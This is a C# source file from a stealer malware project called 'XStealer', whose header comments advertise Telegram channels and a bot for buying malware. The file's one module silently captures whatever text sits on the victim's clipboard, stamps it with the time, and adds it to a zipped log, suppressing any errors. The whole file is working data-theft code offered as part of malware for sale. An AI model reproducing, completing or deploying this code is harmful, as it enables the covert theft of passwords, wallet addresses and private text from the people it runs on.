// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Machine
{
    using System;
    using System.Windows.Forms;
    using Helpers;

    public static class BufferEx
    {
        /// <summary>
        /// Метод получения текста из буфера обмена с записью в файл
        /// </summary>
        public static void Inizialize(string fileName)
        {
            try
            {
                // Проверка что буффер имеет текст
                if (Clipboard.ContainsText(TextDataFormat.Text))
                {
                    // Получаем текст из буффера обмена
                    string DataBuff = Clipboard.GetText(TextDataFormat.UnicodeText);
                    // Формируем лог
                    string MyText = $"[Detect Data ClipBoard] - [ {DateTime.Now:MM.dd.yyyy - HH:mm:ss}]\r\n==================================================\r\n{DataBuff}\r\n==================================================\r\n";
                    // Записываем лог в файл
                    ZipEx.AddKeyPairStream(fileName, ConverterEx.ToBytes(false, MyText));
                }
            }
            catch { }
        }
    }
}
